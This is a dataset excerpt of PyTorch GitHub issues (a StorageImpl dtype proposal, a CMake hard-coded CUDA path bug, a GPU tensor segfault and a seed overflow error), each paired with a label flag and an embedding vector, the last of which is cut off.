Make StorageImpl untyped for non-POD types high priority module: internals triaged module: complex internals,"Right now StorageImpl records a dtype. We should remove the dtype and store bytes directly. Non-POD dtypes should still support custom destruction, but that is built on top of an otherwise untyped representation. Representing storage impls in an untyped way means that we can reinterpret cast tensors, e.g., view a float tensor as a complex tensor.

In the user side we still expose ByteStorage/LongStorage; these should either be eliminated from Python, or implemented as wrappers that know dtype.

cc @ezyang @gchanan @zou3519 @anjali411 @dylanbespalko",True,"[-2.89869845e-01 -2.16980875e-01 -1.65721238e-01 -2.60011494e-01
  1.96646959e-01 -2.30810866e-01 -1.12104304e-01 -3.60018015e-02
 -3.73769045e-01 -1.01260006e-01  5.06053269e-02  1.17665485e-01
 -1.45842865e-01 -1.88151896e-01 -2.35623121e-01 -1.55239999e-01
  2.49051914e-01  3.43642741e-01  2.97890417e-02  3.01072240e-01
  1.29620522e-01  9.99144763e-02 -5.47076948e-02  1.04539283e-02
  1.92110673e-01 -1.07980579e-01  1.46018535e-01 -1.72508538e-01
  4.00456429e-01 -2.93163478e-01  4.28863883e-01  5.76258749e-02
  2.30534226e-01  1.38178989e-01  3.35106254e-02  3.07704479e-01
 -1.79922730e-01 -1.16973795e-01 -5.41042313e-02  9.00795907e-02
  1.82047129e-01  2.86610555e-02  1.23495668e-01  3.12616944e-01
 -1.55684128e-01  7.25314394e-02  8.06208327e-03 -1.00981802e-01
 -8.02350119e-02 -4.54484075e-02  8.94647911e-02  8.67324322e-02
 -2.33693540e-01 -1.21983662e-01 -2.16198087e-01 -3.39715511e-01
  8.27652514e-02 -3.53424177e-02 -1.21341005e-01 -1.71600327e-01
  1.49662614e-01 -1.58396512e-01  3.38140965e-01 -8.27577561e-02
  3.37296546e-01  3.43405306e-01  3.56002957e-01  1.67036325e-01
  5.29103339e-01  6.20876551e-02  1.97471201e-01  3.46996844e-01
 -5.43006718e-01  1.48410916e-01  2.38266699e-02  4.52097684e-01
 -5.99724939e-03  2.83078700e-01  3.97064030e-01 -2.85113633e-01
 -1.57354891e-01 -3.38756368e-02  8.42227936e-02 -2.95553446e-01
 -4.10374254e-02 -2.36522034e-02  3.02969545e-01  8.44229162e-02
 -1.07370839e-01 -5.73783852e-02  1.66413099e-01  7.91724920e-02
 -5.39980382e-02  2.06322700e-01 -1.20917492e-01  2.51436271e-02
  2.15203524e-01  8.97094905e-02 -1.81210697e-01 -5.03964312e-02
 -3.37659180e-01 -8.24054629e-02 -1.34494767e-01  2.47235924e-01
  1.49313986e-01 -2.91406929e-01  1.74019977e-01  1.55940026e-01
 -1.31750345e-01 -1.60224110e-01  3.51907015e-02 -2.99383879e-01
 -6.97489977e-02  9.38729942e-02 -1.95969939e-01 -9.78963450e-04
  1.55810788e-01  3.64186913e-01  1.37364984e-01 -2.53611028e-01
 -5.00107408e-02 -9.39879864e-02  9.62699018e-03  3.26763153e-01
  8.40269104e-02  4.81382310e-02 -2.13701814e-01 -1.30741730e-01
 -1.06700175e-01 -2.08956391e-01  8.53444934e-02 -1.76809788e-01
 -1.67810008e-01  9.64499861e-02  3.62716049e-01  1.30123571e-02
 -2.09611326e-01 -3.95009279e-01 -1.97260633e-01  8.90589058e-02
 -7.49354586e-02  1.78427219e-01 -2.01796427e-01 -1.97300985e-02
  6.80503920e-02  1.76258907e-01 -4.23820652e-02 -3.90148342e-01
 -7.46444054e-03  4.86595035e-01  2.26059258e-02 -4.34390098e-01
 -3.16140592e-01 -1.82045251e-02  1.54666811e-01  4.04486619e-02
  2.36888573e-01 -1.52311921e-01 -2.11815953e-01 -3.29525143e-01
 -1.30136386e-02  6.65617585e-01  1.54381439e-01  1.65794447e-01
 -3.69043201e-02  1.68957382e-01 -1.37446210e-01 -1.11128241e-01
 -8.13888013e-02  7.48387724e-02 -1.90454260e-01 -1.69622660e-01
 -1.35073066e-01 -4.61351424e-02  4.35797751e-01 -3.66924524e-01
 -5.31711400e-01 -4.20849442e-01  1.96568564e-01  4.64413911e-02
 -6.13430925e-02 -4.92392667e-03 -6.89667091e-02 -5.20581119e-02
 -1.49760842e-02 -4.65804785e-02  2.12368608e-01 -2.71626472e-01
 -1.66534811e-01  1.96997792e-01  4.47258763e-02  7.09560141e-02
 -2.71229655e-01 -1.10478684e-01  1.70044620e-02 -3.59292924e-01
  1.54675379e-01  2.97394931e-01  8.96848440e-02 -7.05389827e-02
  3.60464305e-03  1.27276450e-01 -2.71269917e-01  1.68036208e-01
  1.26140118e-01 -1.95692360e-01 -2.98123896e-01 -3.61023881e-02
 -2.87844390e-01  3.14178497e-01 -3.68898571e-01  1.38579950e-01
 -3.63749266e-01 -1.22381836e-01 -6.72260299e-04 -7.07428008e-02
 -9.24688578e-03 -7.36772269e-02 -1.28691345e-02  2.53901541e-01
 -2.70628273e-01 -1.63107067e-01 -2.95381770e-02 -1.66640744e-01
  2.12867990e-01 -1.93260536e-01 -1.41495466e-02  1.13829002e-01
 -3.32851946e-01  3.15680236e-01 -5.19850962e-02  4.09529917e-02
  2.53076613e-01  8.48294795e-02 -2.08619878e-01 -5.13467565e-02
  1.17239095e-02 -2.59068668e-01 -3.20738554e-01 -7.88149387e-02
 -1.63738281e-01 -4.10731733e-02 -2.77057886e-01  4.50612418e-03
 -1.93657085e-01  2.77785689e-01 -1.40606046e-01  3.77378076e-01
 -2.31727958e-01  1.14570037e-01 -2.65042633e-01  2.97997832e-01
  9.58942920e-02 -1.63175821e-01 -1.28788441e-01 -1.35141015e-01
 -1.98036507e-01 -8.51592869e-02 -4.58320975e-03 -8.57258588e-02
  1.53924182e-01  1.84227318e-01 -2.80474484e-01  2.87449062e-01
  5.36668785e-02  4.54604067e-02 -5.06203711e-01  3.33353758e-01
  2.91165531e-01 -3.16600144e-01  5.47602847e-02  9.80244279e-02
  3.75774026e-01 -1.19747132e-01  5.36915585e-02  6.08781725e-02
  3.56942058e-01 -1.32230371e-01 -2.39059567e-01 -4.33991402e-02
 -7.91816413e-03  3.02671492e-01 -6.52349517e-02  2.41193339e-01
  1.19446814e-01 -3.80884945e-01 -1.01829067e-01 -2.90476322e-01
 -3.26316684e-01 -1.68791950e-01 -4.58460823e-02 -1.09259039e-01
 -4.61685136e-02  1.74170956e-02  1.68366134e-01 -3.50114703e-02
  3.80556956e-02 -3.14418711e-02  8.88697654e-02 -2.06535801e-01
 -7.69520923e-02 -1.44189358e-01 -2.98644435e-02 -1.19434707e-01
  2.53928378e-02 -1.21830620e-01  1.91093013e-01  2.71928668e-01
  3.37089539e-01 -8.50119591e-02  1.35339409e-01  5.43394014e-02
 -2.62384057e-01 -1.06453905e-02  7.82954320e-02  1.18361972e-01
 -2.60043740e-01  8.88276935e-01  1.28720999e-01  5.71815670e-03
 -1.76436901e-01 -2.80580699e-01 -6.77475557e-02  1.59241766e-01
 -1.48750842e-01 -2.31099762e-02 -2.00496495e-01  5.79001606e-02
  9.65179130e-02  1.56717241e-01  1.75309226e-01 -2.89250553e-01
 -2.94921845e-01 -3.60023677e-02 -1.23841666e-01  1.67241007e-01
 -6.24307245e-02  2.77897954e-01 -1.85070902e-01  9.91449803e-02
 -6.44055456e-02  1.87835231e-01 -4.84792562e-03 -3.77184987e-01
  1.22429468e-01 -6.43889606e-02  3.11289757e-01  3.24919045e-01
  1.63511172e-01 -1.71673194e-01  2.01196581e-01  1.60255671e-01
  3.08672730e-02  2.38763727e-02  2.57065743e-01  5.76597452e-01
  1.99440032e-01  1.72310203e-01 -1.39509782e-01  5.47926247e-01
 -1.68833390e-01  1.52162444e-02 -1.92600191e-01  1.62797701e-03
  1.23386085e-01 -2.27852792e-01  2.48880908e-01  1.35812983e-01
  1.71145558e-01  3.61865759e-01  1.93138182e-01  3.76773439e-02
 -1.17159322e-01  4.67259705e-01  1.02814682e-01  9.22805816e-02
 -2.97278643e-01  5.28049245e-02 -1.44344851e-01  3.76834273e-01
  1.35136962e-01 -1.40305072e-01 -1.33545011e-01  1.57895714e-01]"
Caffe2 CMake exported target has hard-coded path under linux module: build caffe2 triaged,"## ðŸ› Bug

`Caffe2Targets.cmake` from pytorch installed by conda has hard-coded library path, which will make targets depending on torch unable to build, if the CUDA installation directory is different from `/usr/local/cuda`. Specifically in my case, I installed pytorch `py3.6_cuda9.2.148_cudnn7.6.3_0` and the Caffe2 target file contains:

```
set_target_properties(torch PROPERTIES
  INTERFACE_COMPILE_DEFINITIONS ""_THP_CORE;AT_PARALLEL_OPENMP=1""
  INTERFACE_COMPILE_OPTIONS ""-Wall;-Wextra;-Wno-unused-parameter;-Wno-missing-field-initializers;-Wno-write-strings;-Wno-unknown-pragmas;-Wno-missing-braces;-fopenmp""
  INTERFACE_INCLUDE_DIRECTORIES ""${_IMPORT_PREFIX}/include;${_IMPORT_PREFIX}/include""
  INTERFACE_LINK_LIBRARIES ""protobuf::libprotobuf;c10;Threads::Threads;caffe2::mkl;caffe2::mkldnn;torch::cudart;c10_cuda;/usr/local/cuda/lib64/libnvToolsExt.so;/usr/local/cuda/lib64/libcudart.so;caffe2::cufft;caffe2::curand;caffe2::cudnn;/usr/local/cuda/lib64/libculibos.a;dl;caffe2::cublas""
)
```
## To Reproduce

I'm working on an example for pytorch with CMake, you can find it here: https://github.com/cmpute/pytorch-cmake-example.

If I remove the hard-coded libraries in `Caffe2Targets.cmake`, then the compilation of my extension will succeed.

## Expected behavior

The example is fairly simple, but when you try to build the package, there will be an error:

```log
...
-- Configuring done
-- Generating done
-- Build files have been written to: /home/jacobz/pytorch-cmake-example/_skbuild/linux-x86_64-3.6/cmake-build
ninja: error: '/usr/local/cuda/lib64/libnvToolsExt.so', needed by 'lltm_ext.cpython-36m-x86_64-linux-gnu.so', missing and no known rule to make it
Traceback (most recent call last):
  File ""/home/jacobz/.conda/envs/lidar/lib/python3.6/site-packages/skbuild/setuptools_wrap.py"", line 577, in setup
    cmkr.make(make_args, env=env)
  File ""/home/jacobz/.conda/envs/lidar/lib/python3.6/site-packages/skbuild/cmaker.py"", line 482, in make
    os.path.abspath(CMAKE_BUILD_DIR())))

An error occurred while building with CMake.
  Command:
    ""cmake"" ""--build"" ""."" ""--target"" ""install"" ""--config"" ""Release"" ""--""
  Source directory:
    /home/jacobz/pytorch-cmake-example
  Working directory:
    /home/jacobz/pytorch-cmake-example/_skbuild/linux-x86_64-3.6/cmake-build
Please see CMake's output for more information.
```

## Environment

 - PyTorch Version (e.g., 1.0): 1.3
 - OS (e.g., Linux): Ubuntu
 - How you installed PyTorch (`conda`, `pip`, source): conda
 - Build command you used (if compiling from source): precompiled
 - Python version: 3.6
 - Any other relevant information: scikit-build is also needed

This issue is also reported here: https://github.com/facebookresearch/DensePose/issues/185",True,"[-5.80310486e-02 -5.05017877e-01 -4.40822244e-01  3.00050795e-01
  3.69467854e-01 -1.26208127e-01 -8.62015858e-02  2.52322495e-01
 -3.95728827e-01 -1.31059080e-01  9.91827548e-02 -4.70831096e-01
 -1.41819715e-01 -5.79378791e-02  1.82051554e-01  5.59966564e-02
  5.10862097e-04 -9.01826173e-02  3.54292363e-01 -2.10415479e-02
 -8.49623680e-02  1.99051350e-01 -6.81365579e-02 -8.78422409e-02
  1.63822323e-02  4.16960008e-03 -2.17363220e-02 -1.23094477e-01
  1.13000870e-01 -4.24335618e-03  3.45307827e-01  9.87625271e-02
 -1.76710457e-01  1.32044926e-01  2.07476735e-01  2.79593840e-02
 -3.87957335e-01 -2.20654160e-01  4.48752977e-02 -2.26152912e-01
 -9.71814618e-02  1.62621178e-02 -2.75079124e-02  4.06234115e-02
 -2.46277973e-01 -1.01158515e-01  8.85852873e-02  3.10847878e-01
 -2.97410995e-01 -1.53197974e-01 -1.07790716e-03  1.13242073e-02
 -1.62393481e-01 -2.17835426e-01  1.26901701e-01  3.10513377e-01
 -2.85019904e-01  6.26815259e-01  1.25847280e-01  2.42099702e-01
  2.54272491e-01 -1.97346568e-01 -7.37487599e-02 -1.84101924e-01
  6.11331761e-02  1.39190525e-01 -2.21489102e-01 -1.87193424e-01
  3.53269577e-01 -3.82824421e-01 -2.85582095e-01 -7.48016089e-02
 -2.83743173e-01 -2.91142792e-01  2.23531529e-01  3.09521377e-01
 -2.61153102e-01  4.18801069e-01 -2.02516705e-01 -1.58179939e-01
 -1.97098926e-01  1.65241957e-01  7.01714009e-02 -1.67759150e-01
  6.02634922e-02 -4.91090938e-02  3.21403563e-01 -3.23637217e-01
  1.32842451e-01  7.28755891e-02  3.29699874e-01  2.02654168e-01
  2.69832879e-01  4.44131464e-01 -4.47657883e-01  3.21246684e-01
  2.28530094e-02  3.03988516e-01 -3.30969691e-04 -2.05740511e-01
  8.00200738e-03 -2.74247468e-01 -4.03489232e-01  5.64385891e-01
 -3.24054271e-01 -4.91582692e-01  2.96516001e-01  1.06845558e-01
 -2.72926800e-02 -2.99831480e-01  1.29712552e-01  5.54274581e-02
 -8.09810832e-02  3.66115570e-02  3.73259097e-01  1.44497365e-01
 -4.05492693e-01 -1.71565890e-01  7.23267943e-02  2.00150549e-01
 -3.38730700e-02  3.44319046e-02 -1.90579236e-01 -3.92008685e-02
  1.62596628e-01  8.20872858e-02  1.16436124e-01 -1.31452769e-01
  1.67822242e-01  2.21195862e-01 -1.82657447e-02  1.39601424e-01
  1.11980051e-01  1.17565721e-01 -1.63861468e-01  1.45767838e-01
 -4.78204414e-02 -4.94533442e-02  1.25990212e-01 -6.42270446e-02
 -2.62916058e-01  3.40339959e-01  2.01860309e-01 -2.68059969e-01
 -1.36480764e-01 -1.15178809e-01 -1.97423548e-01  2.46764451e-01
  6.14710413e-02  3.74139875e-01 -1.31010324e-01  3.52363959e-02
 -3.57981503e-01  7.47229815e-01  1.33174598e-01  1.39224529e-01
  1.34549990e-01  1.76935822e-01  1.84451446e-01 -2.87266314e-01
  2.69456524e-02  3.05282354e-01 -2.61168122e-01 -8.76245275e-03
 -3.20923030e-01 -2.05966551e-02 -2.67155468e-01  1.29829168e-01
 -1.93906486e-01 -6.86971769e-02 -7.69100487e-02 -2.32946336e-01
  3.79338920e-01 -3.08968246e-01  5.16957045e-02 -8.71661231e-02
 -1.57450214e-01 -7.41311908e-02  1.10490337e-01  7.03756362e-02
  1.63148493e-01  5.28515399e-01  1.55706108e-01 -1.00872785e-01
 -3.35792661e-01  2.66879141e-01  2.28664696e-01 -2.28697002e-01
 -5.98187000e-02  1.37397796e-01 -5.92435449e-02  1.19895421e-01
  2.90833771e-01  1.12416998e-01 -9.32357311e-02 -6.88840970e-02
  3.77325147e-01  2.85245925e-01 -6.34572841e-03  1.00377038e-01
  2.25868374e-01  5.91606572e-02  4.04097497e-01  1.16359890e-01
 -6.05166256e-02  4.12163213e-02 -2.37318680e-01 -2.13599242e-02
 -5.08556724e-01  2.13648146e-03 -3.42388570e-01 -1.78419903e-01
 -6.27654418e-02 -6.28310293e-02 -2.91383207e-01 -2.24178303e-02
  6.95073977e-03  1.20828584e-01 -1.61555648e-01  3.08606386e-01
 -1.95413269e-02  1.95693783e-02  2.95379832e-02 -1.20263115e-01
  5.44513404e-01  1.61803335e-01  1.24314010e-01 -1.95529759e-01
 -2.20422611e-01  1.23378493e-01 -1.48439914e-01 -9.61116403e-02
  2.95632720e-01  1.09952748e-01 -6.28990605e-02  2.02049479e-01
  1.94012403e-01 -1.39970556e-01 -1.93027496e-01  2.11733013e-01
 -1.52577668e-01 -2.30267588e-02 -2.04188138e-01 -1.53944433e-01
 -1.71118736e-01 -1.72872841e-03 -2.22801492e-01  9.24563259e-02
  6.14746250e-02 -2.13646665e-01  1.90987229e-01 -1.32079899e-01
 -1.00568004e-01  2.96414882e-01  3.21862817e-01  3.46447259e-01
 -1.19982868e-01 -4.11331914e-02 -1.93432178e-02 -3.46651971e-02
  2.81152651e-02  2.53507853e-01 -1.08708441e-01  3.98660630e-01
 -3.80156152e-02 -1.28691852e-01 -4.81789559e-01  1.01031035e-01
 -1.53018996e-01 -7.72466287e-02  1.34151578e-01 -3.80863905e-01
  2.23148167e-01  9.72737372e-02  6.33030474e-01 -4.81657982e-02
  2.15873614e-01 -1.31323755e-01 -8.52876157e-02 -1.67839050e-01
  2.75073290e-01 -9.70538706e-04  2.70434827e-01  3.62057239e-02
  2.69176960e-01  5.45379370e-02 -2.97369093e-01 -2.67419189e-01
 -3.93838286e-01 -3.05374339e-02 -3.33085835e-01  2.88017809e-01
  5.30896664e-01  2.44922370e-01 -1.10135600e-01  2.14061476e-02
  3.24491143e-01  2.17926890e-01 -2.35829353e-02  1.10241719e-01
 -3.46077174e-01  8.22639465e-02 -2.09554255e-01 -1.97465234e-02
 -6.77967146e-02  8.79159868e-02 -5.46185598e-02 -1.93019256e-01
  6.19193912e-01 -3.71860683e-01  1.84778973e-01  3.25265527e-01
 -1.49266422e-01  2.13768467e-01 -1.70580268e-01 -1.20034702e-02
 -5.10876775e-02  2.70245254e-01  2.19937146e-01  1.62553474e-01
 -2.99667597e-01 -1.43556565e-01 -4.23059940e-01  5.05871736e-02
  3.23319972e-01  1.52805969e-01 -4.41960335e-01  6.60334155e-02
 -1.46372616e-01  1.71869233e-01  1.33447975e-01  7.14753941e-02
 -3.14929634e-02  4.15475190e-01 -2.42794044e-02  1.45571738e-01
  5.39317206e-02 -5.97310774e-02 -5.77596426e-02 -1.87082887e-01
 -1.85024649e-01 -4.09888387e-01 -4.11816426e-02 -3.31673294e-01
 -1.08228609e-01 -3.78686875e-01  1.09058157e-01  4.59493369e-01
 -1.94554850e-01 -3.29330206e-01 -5.63926809e-02  2.38578953e-02
  7.76844621e-02 -7.99696743e-02  6.17515966e-02  3.61615598e-01
 -9.53585058e-02  4.52357233e-02  1.40558213e-01 -6.41132593e-02
 -4.13797230e-01 -1.36200309e-01 -2.46882528e-01 -4.07226324e-01
 -3.81056607e-01 -7.91075230e-02 -4.73811835e-01  2.92914286e-02
  1.30227581e-01  2.32582808e-01 -4.36659694e-01  2.52288282e-01
 -8.73559713e-02  1.90475181e-01  3.79128247e-01  1.77183330e-01
 -7.73354694e-02  1.58528775e-01  7.40781799e-03 -1.74970701e-01
 -1.35333791e-01  5.06708801e-01  6.92637265e-02 -6.18293107e-01]"
Segfault upon calling torch.Tensor on a gpu tensor high priority module: crash module: cuda triaged,"## ðŸ› Bug

I accidentally called `torch.Tensor` on a Tensor object, thinking it was a numpy array. Instead of doing nothing or throwing a warning, the program segfaulted. 

## To Reproduce

Minimal code example:

```python
import torch
import numpy as np
device = torch.device('cuda')
a = torch.Tensor(np.random.normal(size=10)).to(device)
torch.Tensor(a)
```

Upon running the final line, python prints ""Segmentation fault (core dumped)"" and dies.

## Expected behavior

I would have expected casting a Tensor to a Tensor to have to result

## Environment

Collecting environment information...
PyTorch version: 1.3.1
Is debug build: No
CUDA used to build PyTorch: 10.1.243

OS: Ubuntu 18.04.4 LTS
GCC version: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
CMake version: Could not collect

Python version: 3.7
Is CUDA available: Yes
CUDA runtime version: Could not collect
GPU models and configuration: GPU 0: GeForce RTX 2060
Nvidia driver version: 430.50
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5

Versions of relevant libraries:
[pip] numpy==1.16.4
[pip] numpydoc==0.9.1
[pip] torch==1.3.1
[pip] torchfile==0.1.0
[pip] torchvision==0.4.2
[conda] blas                      1.0                         mkl  
[conda] mkl                       2019.4                      243  
[conda] mkl-service               2.0.2            py37h7b6447c_0  
[conda] mkl_fft                   1.0.12           py37ha843d7b_0  
[conda] mkl_random                1.0.2            py37hd81dba3_0  
[conda] torch                     1.3.1                    pypi_0    pypi
[conda] torchfile                 0.1.0                    pypi_0    pypi
[conda] torchvision               0.4.2                    pypi_0    pypi

## Additional context

I was able to reproduce the issue running on google CoLab, so I don't think the issue is specific to my computer

cc @ezyang @gchanan @zou3519 @bdhirsh @heitorschueroff @ngimel",True,"[-1.34158850e-01 -4.15458828e-01 -2.80430228e-01 -8.39953870e-02
  3.66496295e-02 -3.08543026e-01 -1.65883303e-02  1.74180850e-01
 -2.64799535e-01 -1.35940567e-01 -1.93776667e-01  1.25677779e-01
 -2.66780257e-01  4.02005792e-01 -1.86750859e-01  1.94533646e-01
 -1.85870975e-01 -8.08355659e-02 -3.11927050e-02 -2.28350848e-01
  3.00853580e-01 -1.43497437e-03 -2.38189086e-01 -2.51732729e-02
 -9.07623209e-04  2.97785670e-01  9.69540700e-03 -2.54670322e-01
  3.92892480e-01 -3.30568776e-02  3.82826999e-02 -3.43222320e-02
 -1.83254033e-01  6.31089807e-02 -8.20316002e-02  2.11244181e-01
 -3.11914265e-01 -1.68837219e-01 -1.83380008e-01 -4.32393365e-02
  6.55203462e-02  9.69672054e-02  1.45148903e-01  1.22311547e-01
 -5.97853474e-02  1.51115686e-01  1.35967672e-01  1.91533305e-02
 -2.10501879e-01 -4.53687869e-02 -8.30866843e-02  9.64589417e-02
 -3.30298007e-01 -2.26059809e-01  1.58738464e-01 -2.58511066e-01
  7.74395019e-02 -4.82160598e-02  1.30421281e-01 -3.79310846e-01
 -6.21720450e-03 -2.62626633e-03 -4.09883894e-02 -6.68328926e-02
  1.41772404e-01  1.66561268e-03  1.53481632e-01  1.06627569e-01
  5.08174777e-01  1.36002433e-02  2.68621236e-01  5.57913110e-02
 -1.10939801e-01 -2.42862664e-02 -2.15658367e-01  1.69411212e-01
 -7.80506134e-02  3.70417714e-01  4.45345007e-02 -4.91537154e-02
  9.89676267e-02  2.07912445e-01  8.05432051e-02 -3.03014398e-01
  2.94686317e-01  1.83304504e-01  5.28550446e-01  2.58645266e-01
  3.44221413e-01 -5.45806773e-02  1.73993662e-01  1.68937832e-01
  6.09728470e-02  1.13918118e-01 -1.26296114e-02  5.65592907e-02
  3.44921738e-01 -2.83376634e-01 -1.52647123e-01 -2.82437742e-01
 -2.93615699e-01 -4.37909633e-01 -3.09960604e-01  6.08852446e-01
  2.47578681e-01  2.95828637e-02  1.33637518e-01  2.16097772e-01
 -6.44989312e-02 -7.42642879e-02  3.58243138e-01  1.20504916e-01
  2.37472028e-01 -5.25786653e-02 -5.91682680e-02  1.58518814e-02
 -2.50684202e-01  1.07323147e-01  1.15783818e-01  5.40739894e-01
  2.46895142e-02  2.64854252e-01  5.88596649e-02  2.07109004e-01
  2.36783087e-01  2.89411187e-01  1.27438242e-02 -1.17809795e-01
 -3.65144312e-02  3.95229682e-02  1.31186306e-01 -1.19411126e-01
 -1.04761302e-01  5.87331876e-02  1.82841718e-01  3.56520236e-01
 -5.09358644e-01  1.00910798e-01 -2.51416922e-01  8.19015801e-02
  1.74148828e-02  1.38233766e-01 -1.41688079e-01 -2.56090194e-01
  3.07373405e-01  1.17237739e-01 -3.54397506e-01  1.16303310e-01
 -3.84026580e-02  1.82273075e-01 -1.14506647e-01 -5.01685217e-02
 -3.99767458e-01  1.21913701e-01 -1.25132650e-02  2.06079744e-02
  3.21508437e-01  1.97685286e-02  1.23892747e-01 -4.14110631e-01
  1.47430718e-01  2.96063483e-01  1.12741426e-01 -5.47556877e-02
  2.13068813e-01  2.85832077e-01 -3.78916681e-01 -3.06932945e-02
 -3.22945237e-01  1.92252591e-01 -2.70768330e-02 -1.84490412e-01
 -1.71353072e-01 -1.29376978e-01  1.82799518e-01 -2.03738451e-01
 -8.91177654e-02 -7.48584390e-01 -1.50885671e-01  1.29959434e-01
  3.01624864e-01  2.54342079e-01  2.68908083e-01 -1.17405266e-01
  5.77558540e-02 -1.09607756e-01  3.68387550e-01 -9.03740078e-02
 -1.37368724e-01 -1.12582706e-01 -3.94745141e-01 -4.31897521e-01
  2.45449603e-01 -1.82472572e-01  2.71981303e-02  2.33537793e-01
  4.92226072e-02 -2.04754800e-01 -1.74870610e-01  5.06259277e-02
 -9.59454477e-02 -3.53208780e-01 -2.65084021e-02  5.15030771e-02
  2.43834853e-01 -1.20061591e-01 -4.90308493e-01 -4.52443868e-01
 -3.91328871e-01  1.26333341e-01 -2.62902044e-02 -5.07337213e-01
 -1.90109968e-01  5.69018051e-02 -2.00781882e-01  4.23555672e-02
 -1.72715098e-01 -9.16306749e-02 -2.86786109e-01  1.71534047e-01
  4.58155066e-01  6.51346445e-02 -3.86242345e-02 -2.30206281e-01
 -4.69452739e-02 -9.93611068e-02 -2.33230844e-01 -8.06340352e-02
 -8.98770094e-02  1.32644027e-01  8.80475491e-02 -1.22565404e-01
 -1.46662161e-01 -1.22996122e-01 -9.32919756e-02  1.32258877e-01
 -1.23092920e-01 -1.28068611e-01 -1.61695510e-01  3.19203973e-01
 -2.58690596e-01  8.79609957e-02  1.06682777e-01 -1.49199933e-01
 -2.15099737e-01  3.28516811e-01 -2.62905397e-02 -6.11607358e-02
 -3.49458694e-01  2.71763206e-01  1.56436011e-01  2.06863414e-02
 -1.07565358e-01  4.57489640e-02  4.31252569e-01 -4.74236719e-02
 -4.99754474e-02  1.40304044e-01 -5.91972582e-02  8.22692141e-02
  3.13152730e-01  6.92354739e-02 -2.32708249e-02  5.45150042e-01
  1.44001633e-01  3.14794987e-01 -7.05948770e-02  4.45245951e-01
 -5.80446497e-02 -2.43433103e-01 -2.52025127e-01 -2.87454594e-02
  4.69556659e-01 -2.31173366e-01  9.97687504e-03 -3.80302906e-01
  3.42026711e-01  5.21480218e-02 -1.01158082e-01 -2.40293667e-01
  2.25803137e-01  1.17443979e-01 -2.53608137e-01  3.86808634e-01
  1.82497367e-01 -3.34231466e-01 -2.58546323e-01 -2.17240199e-01
 -2.62251683e-02  1.68655859e-03 -4.65764523e-01  2.07404166e-01
  4.65220481e-01 -1.44306540e-01 -2.52812535e-01  3.34620863e-01
  1.26752838e-01  7.44337309e-03 -7.60573447e-02 -1.97736874e-01
 -4.85292450e-02  1.92593560e-01  1.32922411e-01 -1.00688495e-01
  1.14329934e-01 -2.20452473e-01  2.25620866e-01  7.61462674e-02
  3.05867374e-01 -3.89393508e-01  3.34356427e-01 -1.77427322e-01
  3.03694978e-04  1.22756407e-01 -2.85425723e-01  8.33491534e-02
 -4.10744250e-02  4.54475164e-01  4.32985306e-01 -2.03910917e-02
 -1.01753712e-01 -1.59177884e-01 -1.35026917e-01  1.49101734e-01
 -8.85799974e-02 -5.32209873e-03 -1.59768522e-01  1.35883749e-01
 -1.25932291e-01  8.71675089e-03 -1.81432009e-01 -2.56940126e-01
  1.02525234e-01  2.05160797e-01 -2.40593985e-01 -1.73523784e-01
 -7.07077906e-02  1.49895549e-01  1.10582665e-01 -2.18639582e-01
 -1.83621496e-01 -2.28130624e-01 -1.04797781e-01 -1.80100694e-01
 -1.90344229e-01 -2.77503699e-01  5.68502784e-01  3.51370811e-01
  1.40293926e-01 -1.59841254e-01 -3.89173388e-01 -2.84774676e-02
  5.79672828e-02  3.11466396e-01 -7.93290585e-02  5.05844951e-01
  1.25675902e-01  4.82329503e-02  2.39978470e-02  2.80068517e-01
  4.18574885e-02  7.25734606e-02 -3.63566935e-01 -1.75159380e-01
  3.58175263e-02 -9.09322873e-02 -1.27823323e-01 -2.51194268e-01
  2.88883537e-01  5.60467720e-01  8.54043365e-02  3.83505523e-01
 -1.97096616e-02  5.32635450e-01  5.19499421e-01 -2.49608189e-01
 -2.57407725e-01  5.04924618e-02  9.95522812e-02 -1.26712292e-01
  1.59678519e-01  1.34393126e-01 -1.40288219e-01 -2.33391672e-01]"
`torch.seed()` and `torch.initial_seed()` returns not-long numbers high priority triaged module: random,"Our function that give the current or initial seed do not play well with setting these seeds.

```python
import torch

torch.manual_seed(torch.initial_seed()) # Same with torch.seed()
```
Fails with:
```
---------------------------------------------------------------------------
RuntimeError                              Traceback (most recent call last)
<ipython-input-1-055df2441829> in <module>
----> 1 import torch; torch.manual_seed(torch.initial_seed())

source/torch/random.py in manual_seed(seed)
     32         torch.cuda.manual_seed_all(seed)
     33
---> 34     return default_generator.manual_seed(seed)
     35
     36

RuntimeError: Overflow when unpacking long
```



cc @ezyang @gchanan @zou3519 @pbelevich",True,"[-5.65354288e-01 -3.04012299e-02 -5.92114963e-02 -6.22383617e-02
  5.12753487e-01  1.31300777e-01 -3.91585469e-01  1.53805912e-01
 -7.74890184e-01  1.18474633e-01  6.08636700e-02  7.24087134e-02
 -4.75520372e-01  3.97524893e-01  7.11122975e-02  3.90007228e-01
 -5.15049458e-01 -2.51584917e-01 -1.22048154e-01  2.08219051e-01
  3.63342613e-01 -2.38266855e-01 -7.04312623e-02 -8.00110400e-02
  1.45235315e-01 -3.85487638e-02 -4.57431406e-01 -6.43708482e-02
  5.59211671e-01  2.04320878e-01  2.35491335e-01  4.13607389e-01
 -2.01268718e-01  2.82960117e-01  4.26008165e-01  2.34755307e-01
 -6.52571678e-01 -6.02146685e-02 -6.60419166e-02  1.10832624e-01
  1.93349227e-01 -2.94705570e-01 -2.64621004e-02  2.35312432e-01
 -2.82981932e-01  1.36961654e-01 -6.76724762e-02  4.02743101e-01
  2.17230245e-03 -2.26721898e-01 -2.19080329e-01  6.56070784e-02
 -3.18900287e-01 -5.52958012e-01  2.84593701e-01  4.46271375e-02
 -9.88468379e-02  1.03476606e-02  1.91868871e-01 -3.26356441e-01
  9.47949812e-02  2.39788927e-03 -1.29068911e-01  1.53201908e-01
 -6.03507832e-03 -3.55712503e-01 -5.93180537e-01  2.01946169e-01
  6.11631989e-01 -2.55015139e-02  3.87252748e-01  3.84282589e-01
 -2.52665997e-01  3.03945154e-01 -2.44558990e-01  6.02003515e-01
 -3.75437498e-01  1.04837716e-01 -1.41167834e-01 -1.30145833e-01
 -3.55319619e-01 -5.33345491e-02 -4.25199449e-01 -3.99268031e-01
 -8.02864805e-02  3.52501601e-01  4.24501359e-01 -1.06926888e-01
  3.20588768e-01  2.04889864e-01  4.28647280e-01 -2.62407869e-01
 -2.51177132e-01  6.33829236e-01  3.12863924e-02  2.43718654e-01
